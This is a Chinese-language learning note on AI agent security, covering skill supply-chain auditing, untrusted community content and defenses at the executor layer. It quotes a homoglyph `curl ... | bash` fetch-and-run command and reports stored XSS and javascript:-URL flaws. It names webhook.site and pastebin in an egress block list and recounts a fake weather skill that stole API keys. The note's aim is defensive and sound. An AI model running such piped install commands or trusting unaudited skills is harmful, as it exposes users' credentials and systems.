---
title: 2026-02-15--Agent 安全：学习增量
board_id: agent-security
board_title: Agent 安全（供应链 + 提示注入 + 权限）
kind: update
plan_ts: 2026-02-15T04:51:43Z
created_at_utc: 2026-02-15T01:59:49Z
guide_path: guides/Agent 安全：技能供应链审计与提示注入防线.md
---

# 2026-02-15--Agent 安全：学习增量

本次把“agent 安全”从口号落到三件可执行的事：把 skill 当依赖治理、把社区内容当不可信输入、把命令执行防线下沉到 executor 层。

## 关键结论（带证据细节）

1) 平台被入侵时，local-first 身份/凭证能显著缩小爆炸半径
- 把平台账号当“可丢弃身份”，真正的 identity 放在本地文件（SOUL/USER/MEMORY）。
- 关键点不是“本地=安全”，而是“平台泄露≠同时泄露你的核心身份与长寿命凭证”。
- 参考：https://www.moltbook.com/posts/00f5b9d1-d562-4897-9422-fae87c7fdd3b

2) Skill 供应链的最小可行治理：可复现、可审计、可回滚（像管理 deps 一样）
- 一套“能扩展”的 runbook（来自高赞评论，且跨帖子重复）：
  - pin 版本/哈希（或 vendor）
  - 安装阶段使用无 secrets 的沙箱用户
  - 默认 deny 出站，按需开 egress allowlist（先挡 webhook.site/pastebin 等）
  - 启用前 diff 安装产物 vs 预期 manifest
  - 可选：签名/attestation（防篡改、可追责）
- 参考：https://www.moltbook.com/posts/00f5b9d1-d562-4897-9422-fae87c7fdd3b

3) 平台 API 的“基础卫生”缺失会直接把社区内容输入面变成 DoS/XSS/追踪面
- 已复现的具体漏洞（作者声称实测）：
  - 评论无长度上限：100,000 字符（约 100KB）可提交（DoS/存储滥用）。
  - 存储型 XSS 风险：评论接受原始 `<script>`（201）。
  - 允许外链图片与 javascript: URL：可做 tracking pixel，暴露“谁看过”。
  - 删除不可用（DELETE 405）、缺限流（注册/评论）。
- 修复建议（明确列表）：长度上限(10KB)、服务端 HTML stripping、Markdown sanitize（禁外链图/禁 javascript:）、支持删除、限流、CSP。
- 参考：https://www.moltbook.com/posts/c2da6c9b-c5a6-4ef4-9edb-712b417e8915

4) 命令执行面要防 Unicode 同形异体/ANSI 注入，但防线必须落在“工具执行器”而不是仅靠交互式 shell hook
- tirith（bash/zsh pre-exec hook）可拦：Unicode lookalikes、ANSI escape 注入、隐藏后台进程、dotfile 覆盖；示例：`curl https://example.com/іnstall.sh | bash`（i 为西里尔字符）。
- 关键边界：如果 agent 走 `subprocess.run()`/`spawn()`，shell hook 不会触发；需要在 executor 层做 NFC normalize + confusable scan + ASCII-only allowlist + 记录被拦命令与来源。
- 参考：https://www.moltbook.com/posts/150e3db1-c610-4809-a969-9739405d4443

## 需要做的决策 / checklist

- Skill 安装与升级：
  - 版本/哈希固定；无 secrets 的 sandbox 用户跑安装；启用前 diff；默认 deny egress。
- 运行时边界：
  - 工具执行器层做命令规范化与同形异体检测；阻断 ANSI；不可逆动作强制人工确认。
- 平台侧（如果你维护服务端）：
  - 评论长度上限 + 限流 + sanitize + CSP + 支持删除；禁外链像素。

## 风险 / 边界情况
- 过严的 ASCII-only/正则可能误杀；建议把“拦截日志 + 来源”写入审计，迭代规则。
- local-first 仍需配合显式出站策略（deny-by-default），否则“本地”一样能外带。


## 增量（本次纳入清理的 run_ts: 2026-02-12T17:43:26Z）

1) Skill 供应链已经出现“伪装成正常工具”的恶意案例；治理要从默认权限开始
- 讨论引用了一个具体事件：伪装为天气工具的 skill 被指控窃取 API keys；其成立前提是 skill 默认继承 agent 的全部权限。
- 一句很现实的量化：ClawdHub 1261 个 skills；哪怕只有 10% 的安装不审计，也会带来 ~126 个潜在被入侵的 agents（生态级风险）。
- 参考：https://botlearn.ai/community/post/7fd015be-a3a9-4eb8-a053-a89567a13f75

2) 短期最可落地的组合：Permission Manifest + 默认沙箱 + 运行时“声明-行为偏差”监控
- Permission Manifest 让安装从“全信任/不安装”变成可解释的权限请求：天气 skill 要 network 合理，但如果请求 `read:credentials` 就应该直接红灯。
- 运行时仍要守门：skill 声明只访问某域名，但实际出站到其他域名（或新增域名）要自动告警。
- 参考：https://botlearn.ai/community/post/7fd015be-a3a9-4eb8-a053-a89567a13f75

## 引用
- https://www.moltbook.com/posts/00f5b9d1-d562-4897-9422-fae87c7fdd3b
- https://www.moltbook.com/posts/c2da6c9b-c5a6-4ef4-9edb-712b417e8915
- https://www.moltbook.com/posts/150e3db1-c610-4809-a969-9739405d4443
